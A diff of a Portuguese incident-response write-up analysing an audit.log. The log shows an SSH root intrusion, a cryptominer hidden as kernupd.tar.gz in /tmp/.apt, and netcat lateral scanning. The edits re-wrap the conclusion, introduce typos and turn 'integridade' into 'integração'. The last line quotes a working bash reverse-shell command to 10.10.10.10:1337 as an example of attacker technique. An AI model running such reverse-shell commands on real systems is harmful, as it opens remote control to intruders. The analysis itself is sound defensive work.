@@ -295,7 +295,7 @@ Observando as datas dos eventos, percebo 6 períodos diferentes: 21/08/2025, 28/
     </details>
   </details>
 
-  - 28 de agosto de 2025:
+- 28 de agosto de 2025:
     
     Novamente altera a senha do usuário ubuntu, inicia o serviço ssh e habilita o usuário ubuntu (log1). Então o usuário acessa o arquivo “bash.bashrc” às 11:52 e novamente às 11:53, o que pode indicar possível injeção de script para pesistência, in (log2). Por fim, encerra a conexão (log3), repetindo o processo de conexão.
     <details>
@@ -505,7 +505,20 @@ type=EXECVE msg=audit(09/11/25 21:15:20.513:2287) : argc=3 a0=bash a1=-c a2=for 
 
 ### Conclusão
 
-A análise detalhada do arquivo `audit.log` confirma o comprometimento total da máquina virtual por meio de uma cadeia de infecção bem-sucedida voltada à execução de um cryptominer. O incidente teve início com a quebra de segurança no serviço SSH, onde o atacante obteve acesso direto como superusuário utilizando o IP externo `45.9.148.125` [audit.log]. Imediatamente após a autenticação bem-sucedida, técnicas automatizadas de reconhecimento e evasão de defesa foram acionadas para mapear o ambiente [audit.log]. O invasor buscou ativamente pela presença de soluções de segurança e EDRs (como CrowdStrike, SentinelOne e Trend Micro) [audit.log] e realizou a enumeração de usuários do sistema, garantindo que suas atividades não fossem mitigadas de forma precoce. [1]Dando continuidade ao ataque, o vetor de persistência e ocultação foi consolidado com o download e a descompactação do arquivo `kernupd.tar.gz` dentro do diretório `/tmp/.apt` [audit.log]. Esta escolha de nomenclatura e localização simula de forma fraudulenta componentes legítimos do gerenciador de pacotes e atualizações do sistema operacional, configurando uma clara tentativa de mascaramento tático [audit.log]. O binário malicioso recebeu permissões de execução e foi disparado em segundo plano por meio do comando `nohup` (continuar rodando em segundo plano), uma abordagem padrão para garantir que o processo de mineração continue consumindo os recursos computacionais da VM de forma ininterrupta, mesmo após o encerramento da sessão interativa [audit.log].Por fim, as evidências apontam que o impacto do ataque não se restringiu à máquina local. Utilizando o servidor comprometido como ponto de apoio, o atacante iniciou uma fase de movimentação lateral na rede interna [audit.log]. Através de um loop em Bash e do utilitário Netcat, foi realizado um escaneamento focado na porta 22 (SSH) cobrindo a faixa de IPs `10.10.12.1` a `10.10.12.10` [audit.log], com o objetivo de identificar novos alvos vulneráveis e expandir a infraestrutura de mineração. Diante do controle total obtido pelo invasor em nível de root, a integridade do sistema operacional está completamente violada [audit.log]. A recomendação de segurança para a remediação imediata envolve o isolamento de rede da VM, o bloqueio do IP de origem, a revogação de credenciais e a reconstrução total da instância a partir de uma imagem limpa e segura.
+A análise detalhada do arquivo `audit.log` confirma o comprometimento total da máquina virtual por meio de uma cadeia de infecção bem-sucedida voltada à execução de um cryptominer. O incidente
+teve início com a quebra de segurança no serviço SSH, onde o atacante obteve acesso direto como superusuário utilizando o IP externo `45.9.148.125` [audit.log]. Imediatamente após a autenticação
+bem-sucedida, técnicas automatizadas de reconhecimento e evasão de defesa foram acionadas para mapear o ambiente [audit.log]. O invasor buscou ativamente pela presença de soluções de segurança e 
+EDRs (como CrowdStrike, SentinelOne e Trend Micro) [audit.log] e realizou a enumeração de usuários do sistema, garantindo que suas atividades não fossem mitigadas de forma precoce. [1]Dando 
+continuidade ao ataque, o vetor de persistência e ocultação foi consolidado com o download e a descompactação do arquivo `kernupd.tar.gz` dentro do diretório `/tmp/.apt` [audit.log]. Esta escolha
+de nomenclatura e localização simula de forma fraudulenta componentes legítimos do gerenciador de pacotes e atualizações do sistema operacional, configurando uma clara tentativa de mascaramento
+tático [audit.log]. O binário malicioso recebeu permissões de execução e foi disparado em segundo plano por meio do comando `nohup` (continuar rodando em segundo plano), uma abordagem padrão para
+garantir que o processo de mineração continue consumindo os recursos computacionais da VM de forma ininterrupta, mesmo após o encerramento da sessão interativa [audit.log]~. Por fim, as evidências
+apontam que o impacto do atauqe não se restringiu à máquina local. Utilizando o servidor comprometido como ponto de apoio, o atacante iniciou uma fase de movimentação lateral na rede interna
+[audit.log]. Através de um loop em Bash e do utilitário Netcat, foi realizado um escaneamento focado na porta 22 (SSH) cobrindo a faixa de IPs `10.10.12.1` a `10.10.12.10` [audit.log], com o
+objetivo de identificar novos alvos vulneráveis e expandir a infraestrutura de mineração. Diante do controle total obtido pelo invasor em nível de root, a integração do sistema operacional está
+completamente violada [audit.log]. A reocmendação de segurança para a remediação imediata envolve o isolamento de rede da VM, o bloqueio do IP de origem, a revogação de credenciais e a 
+reconstrução total da instância a partir de uma imagem limpa e segura.
+
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Após conseguir acesso a um sistema, para facilitar a exploração, agentes de ameaça utilizam reverse shells ou shells reversos TryHackMe Shells Overview e para isso, utilizam algumas estratégias como: 
 - `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` → a vítima abre um bash para 10.10.10.10:1337
